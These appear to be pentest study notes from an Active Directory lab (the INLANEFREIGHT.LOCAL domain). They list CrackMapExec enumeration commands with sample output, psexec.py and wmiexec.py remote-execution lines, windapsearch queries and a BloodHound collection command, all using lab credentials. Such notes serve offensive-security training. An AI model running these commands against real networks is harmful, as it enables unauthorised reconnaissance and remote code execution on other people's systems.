# Credentialed Enumeration - from Linux

### CrackMapExec

```markdown
**CME - Domain User Enumeration
*sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users*

CME - Domain Group Enumeration
*sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups*

CME - Logged On Users
*sudo crackmapexec smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-users*

Share Enumeration - Domain Controller
*sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares*

Spider_plus
*sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'

SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\forend:Klmcargo2 
SPIDER_P... 172.16.5.5      445    ACADEMY-EA-DC01  [*] Started spidering plus with option:
SPIDER_P... 172.16.5.5      445    ACADEMY-EA-DC01  [*]        DIR: ['print$']
SPIDER_P... 172.16.5.5      445    ACADEMY-EA-DC01  [*]        EXT: ['ico', 'lnk']
SPIDER_P... 172.16.5.5      445    ACADEMY-EA-DC01  [*]       SIZE: 51200
SPIDER_P... 172.16.5.5      445    ACADEMY-EA-DC01  [*]     OUTPUT: /tmp/cme_spider_plus***

```

```markdown
***psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125  

wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5  

python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da

python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU***
```

```markdown
BloodHound-

sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all
```